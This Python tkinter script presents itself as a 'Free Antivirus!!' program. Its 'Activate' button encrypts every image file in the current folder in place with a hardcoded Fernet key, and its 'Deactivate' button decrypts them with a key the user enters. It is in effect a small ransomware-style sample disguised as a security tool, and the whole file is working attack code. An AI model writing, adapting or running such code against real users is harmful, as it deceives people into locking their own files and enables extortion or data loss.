import tkinter as tk
from tkinter import PhotoImage
import os
from cryptography.fernet import Fernet


def button_click(id):
    if id:
        def encrypt_file(key, input_file, output_file):
                    with open(input_file, "rb") as f:
                        data = f.read()

                    fernet = Fernet(key)
                    encrypted_data = fernet.encrypt(data)

                    with open(output_file, "wb") as f:
                        f.write(encrypted_data)
                    
        image_files = []
        for file_name in os.listdir('./'):
            if os.path.isfile(os.path.join('./', file_name)):
                if file_name.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                    encrypt_file('GxFV4QY4hjYxt-0br98qFZLWCD6nncrgJfEG7gKwioY=',file_name,file_name)
                    image_files.append(os.path.join('./', file_name))
        print('Activated Successfully! ')
    else:
        text_field.config(state='normal')
        key = text_field.get()
        if not key:
             return
        def decrypt_file(key, input_file, output_file):
            with open(input_file, "rb") as f:
                encrypted_data = f.read()

            fernet = Fernet(key)
            decrypted_data = fernet.decrypt(encrypted_data)

            with open(output_file, "wb") as f:
                f.write(decrypted_data)

        for file_name in os.listdir('./'):
                if os.path.isfile(os.path.join('./', file_name)):
                    if file_name.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                        print('decrypted')
                        decrypt_file(key,file_name,file_name)
window = tk.Tk("Antivirus")


label = tk.Label(window,text="Free Antivirus!! ",font=('roboto',50))
label.place(relx=0.5, rely=0.4, anchor=tk.CENTER)


button1 = tk.Button(window, text="Activate", command=lambda: button_click(1))
button1.place(relx=0.4, rely=0.6, anchor=tk.CENTER)

button2 = tk.Button(window, text="Deactivate", command=lambda: button_click(0))
button2.place(relx=0.5, rely=0.6, anchor=tk.CENTER)

text_field = tk.Entry(window, state="disabled")
text_field.place(relx=0.5,rely=0.7,anchor=tk.CENTER,width=500)


window.mainloop()